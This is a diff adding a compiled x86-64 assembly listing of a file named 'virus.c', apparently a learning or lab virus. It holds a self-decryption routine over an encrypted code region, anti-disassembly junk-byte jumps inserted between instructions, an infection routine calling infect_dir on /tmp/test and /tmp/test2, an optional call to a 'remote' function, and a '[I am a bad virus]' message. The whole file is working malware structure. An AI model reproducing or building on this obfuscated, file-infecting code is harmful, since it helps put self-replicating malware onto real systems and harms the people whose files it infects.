@@ -1,0 +1,251 @@
+	.file	"virus.c"
+	.comm	bin_start,8,8
+	.comm	crypt_start,8,8
+	.comm	crypt_end,8,8
+	.comm	bin_end,8,8
+	.section	.textearly,"ax",@progbits
+	.globl	entry
+	.type	entry, @function
+entry:
+.LFB5:
+	.cfi_startproc
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset 6, -16
+			jmp .okok0_15 ; outsb  %ds:(%rsi),(%dx) ; and    %dh,(%rcx) ; xor    %ah,%cs:(%rax) ; sub    %ah,0x29(%rbx) ; outsl  %ds:(%rsi),(%dx) ; and %ah,%fs:0x79(%rdx) ; and    %ch,0x64(%rsi) ; outsl  %ds:(%rsi),(%dx) ; .okok0_15:
+	movq	%rsp, %rbp
+			mov %rax, %rax
+	.cfi_def_cfa_register 6
+	subq	$16, %rsp
+	movl	%edi, -4(%rbp)
+	movq	%rsi, -16(%rbp)
+	movl	$0, %eax
+	call	decrypt
+			mov %rax, %rax
+			jmp .okok0_2 ;  and    %ch,0x64(%rsi) ; .byte 0xEB ; .byte 0xcb ; .okok0_2:
+	testl	%eax, %eax
+			jmp .okok0_1 ;  and    %ch,0x64(%rsi) ; .byte 0xEB ; .byte 0xcb ; .okok0_1:
+	je	.L2
+			mov %rax, %rax
+	movq	-16(%rbp), %rdx
+	movl	-4(%rbp), %eax
+	movq	%rdx, %rsi
+			mov %rax, %rax
+	movl	%eax, %edi
+	call	virus
+			jmp .okok0_4 ; outsb  %ds:(%rsi),(%dx) ; and    %dh,(%rcx) ; xor    %ah,%cs:(%rax) ; sub    %ah,0x29(%rbx) ; outsl  %ds:(%rsi),(%dx) ; and %ah,%fs:0x79(%rdx) ; and    %ch,0x64(%rsi) ; outsl  %ds:(%rsi),(%dx) ; .okok0_4:
+			mov %rax, %rax
+	testl	%eax, %eax
+	je	.L2
+			jmp .okok0_13 ; outsb  %ds:(%rsi),(%dx) ; and    %dh,(%rcx) ; xor    %ah,%cs:(%rax) ; sub    %ah,0x29(%rbx) ; outsl  %ds:(%rsi),(%dx) ; and %ah,%fs:0x79(%rdx) ; and    %ch,0x64(%rsi) ; outsl  %ds:(%rsi),(%dx) ; .okok0_13:
+	movl	$1, %eax
+	jmp	.L4
+			mov %r9, %r9
+			jmp .okok0_5 ; .byte 71 ; .okok0_5:
+.L2:
+	movl	$0, %eax
+.L4:
+	leave
+	.cfi_def_cfa 7, 8
+			mov %rax, %rax
+	ret
+			mov %r9, %r9
+	.cfi_endproc
+.LFE5:
+	.size	entry, .-entry
+	.globl	decrypt
+	.type	decrypt, @function
+decrypt:
+.LFB2:
+	.cfi_startproc
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset 6, -16
+	movq	%rsp, %rbp
+	.cfi_def_cfa_register 6
+	subq	$48, %rsp
+	leaq	crypt_start(%rip), %rax
+	movq	%rax, -32(%rbp)
+	leaq	crypt_end(%rip), %rdx
+	leaq	crypt_start(%rip), %rax
+	subq	%rax, %rdx
+	movq	%rdx, %rax
+	movq	%rax, -40(%rbp)
+	movq	$0, -8(%rbp)
+	jmp	.L6
+.L8:
+	movq	-8(%rbp), %rax
+	addq	$8, %rax
+	cmpq	-40(%rbp), %rax
+	jnb	.L7
+	movq	-32(%rbp), %rdx
+	movq	-8(%rbp), %rax
+	addq	%rdx, %rax
+	leaq	key(%rip), %rsi
+	movq	%rax, %rdi
+	call	decrypt_block_asm@PLT
+.L7:
+	addq	$8, -8(%rbp)
+.L6:
+	movq	-8(%rbp), %rax
+	cmpq	-40(%rbp), %rax
+	jb	.L8
+	movq	$15, -40(%rbp)
+	movq	$0, -16(%rbp)
+	jmp	.L9
+.L11:
+	movq	-16(%rbp), %rax
+	addq	$8, %rax
+	cmpq	-40(%rbp), %rax
+	jnb	.L10
+	leaq	test_area(%rip), %rdx
+	movq	-16(%rbp), %rax
+	addq	%rdx, %rax
+	leaq	key(%rip), %rsi
+	movq	%rax, %rdi
+	call	decrypt_block_asm@PLT
+.L10:
+	addq	$8, -16(%rbp)
+.L9:
+	movq	-16(%rbp), %rax
+	cmpq	-40(%rbp), %rax
+	jb	.L11
+	movl	$0, -20(%rbp)
+	jmp	.L12
+.L15:
+	movl	-20(%rbp), %eax
+	movslq	%eax, %rdx
+	leaq	test_area(%rip), %rax
+	addq	%rdx, %rax
+	movzbl	(%rax), %eax
+	cmpb	$65, %al
+	je	.L13
+	movl	$0, %eax
+	jmp	.L14
+.L13:
+	addl	$1, -20(%rbp)
+.L12:
+	movl	-20(%rbp), %eax
+	cltq
+	cmpq	-40(%rbp), %rax
+	jb	.L15
+	movl	$1, %eax
+.L14:
+	leave
+	.cfi_def_cfa 7, 8
+	ret
+	.cfi_endproc
+.LFE2:
+	.size	decrypt, .-decrypt
+	.section	.rodata
+.LC0:
+	.string	"/tmp/test"
+.LC1:
+	.string	"/tmp/test2"
+	.text
+	.globl	do_infection
+	.type	do_infection, @function
+do_infection:
+.LFB3:
+	.cfi_startproc
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset 6, -16
+	movq	%rsp, %rbp
+	.cfi_def_cfa_register 6
+	subq	$32, %rsp
+	leaq	bin_start(%rip), %rax
+	movq	%rax, -8(%rbp)
+	leaq	bin_end(%rip), %rdx
+	leaq	bin_start(%rip), %rax
+	subq	%rax, %rdx
+	movq	%rdx, %rax
+	movq	%rax, -16(%rbp)
+	leaq	crypt_start(%rip), %rdx
+	leaq	bin_start(%rip), %rax
+	subq	%rax, %rdx
+	movq	%rdx, %rax
+	movq	%rax, -24(%rbp)
+	leaq	crypt_end(%rip), %rdx
+	leaq	crypt_start(%rip), %rax
+	subq	%rax, %rdx
+	movq	%rdx, %rax
+	movq	%rax, -32(%rbp)
+	movq	-32(%rbp), %rsi
+	movq	-24(%rbp), %rcx
+	movq	-16(%rbp), %rdx
+	movq	-8(%rbp), %rax
+	movzbl	opt(%rip), %edi
+	movzbl	1+opt(%rip), %r8d
+	salq	$8, %r8
+	orq	%rdi, %r8
+	movzbl	2+opt(%rip), %edi
+	salq	$16, %rdi
+	orq	%r8, %rdi
+	movq	%rdi, %r9
+	movq	%rsi, %r8
+	movq	%rax, %rsi
+	leaq	.LC0(%rip), %rdi
+	call	infect_dir@PLT
+	movq	-32(%rbp), %rsi
+	movq	-24(%rbp), %rcx
+	movq	-16(%rbp), %rdx
+	movq	-8(%rbp), %rax
+	movzbl	opt(%rip), %edi
+	movzbl	1+opt(%rip), %r8d
+	salq	$8, %r8
+	orq	%rdi, %r8
+	movzbl	2+opt(%rip), %edi
+	salq	$16, %rdi
+	orq	%r8, %rdi
+	movq	%rdi, %r9
+	movq	%rsi, %r8
+	movq	%rax, %rsi
+	leaq	.LC1(%rip), %rdi
+	call	infect_dir@PLT
+	nop
+	leave
+	.cfi_def_cfa 7, 8
+	ret
+	.cfi_endproc
+.LFE3:
+	.size	do_infection, .-do_infection
+	.section	.rodata
+.LC2:
+	.string	"[I am a bad virus]"
+	.text
+	.globl	virus
+	.type	virus, @function
+virus:
+.LFB4:
+	.cfi_startproc
+	pushq	%rbp
+	.cfi_def_cfa_offset 16
+	.cfi_offset 6, -16
+	movq	%rsp, %rbp
+	.cfi_def_cfa_register 6
+	subq	$16, %rsp
+	movl	%edi, -4(%rbp)
+	movq	%rsi, -16(%rbp)
+	movzbl	1+opt(%rip), %eax
+	testb	%al, %al
+	je	.L18
+	call	remote@PLT
+.L18:
+	movzbl	2+opt(%rip), %eax
+	testb	%al, %al
+	je	.L19
+	leaq	.LC2(%rip), %rdi
+	call	println@PLT
+.L19:
+	movl	$0, %eax
+	call	do_infection
+	movl	$1, %eax
+	leave
+	.cfi_def_cfa 7, 8
+	ret
+	.cfi_endproc
+.LFE4:
+	.size	virus, .-virus
+	.ident	"GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516"
+	.section	.note.GNU-stack,"",@progbits
